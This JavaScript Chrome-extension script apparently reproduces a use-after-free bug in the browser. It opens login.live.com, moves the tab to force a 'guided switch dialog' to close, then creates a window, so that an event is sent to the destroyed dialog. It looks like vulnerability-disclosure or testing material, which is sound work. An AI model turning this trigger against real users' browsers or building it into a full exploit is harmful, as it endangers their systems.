startProcess();

function startProcess() {
    chrome.windows.create({url: "about:blank"}, function (window) {
        onTabCreated(window.tabs[0]);
    });
}

function onTabCreated(tab) {
    chrome.tabs.update(tab.id, {url: "https://login.live.com/"});

    chrome.tabs.onUpdated.addListener(function tabUpdateListener(tabId, changeInfo) {
        if (changeInfo.status === "complete" && tabId === tab.id) {
            chrome.tabs.onUpdated.removeListener(tabUpdateListener);

            // Wait a bit for the guided switch dialog to be shown.
            setTimeout(() => {
                onLoginPageLoaded(tab);
            }, 2000);
        }
    });
}

function onLoginPageLoaded(tab) {
    // Moving the tab to a new window will result in the original window being closed (since it only
    // had a single tab).
    chrome.windows.create({tabId: tab.id}, function () {
        onTabMovedToNewWindow(tab);
    });
}

function onTabMovedToNewWindow(tab) {
    // This will result in the guided switch dialog being closed.
    chrome.tabs.update(tab.id, {url: "about:blank"});

    chrome.tabs.onUpdated.addListener(function tabUpdateListener(tabId, changeInfo) {
        if (changeInfo.status === "complete" && tabId === tab.id) {
            chrome.tabs.onUpdated.removeListener(tabUpdateListener);

            // The timeout here is to give the dialog a chance to close. The dialog widget is
            // destroyed by a task posted to the UI thread. That task may not run immediately,
            // so it's important to wait a bit to ensure the dialog has been closed by the time
            // the window is created.
            // Once the window has been created, BrowserList will attempt to dispatch an event to
            // the destroyed guided switch dialog.
            setTimeout(() => {
                chrome.windows.create();
            }, 2000);
        }
    });
}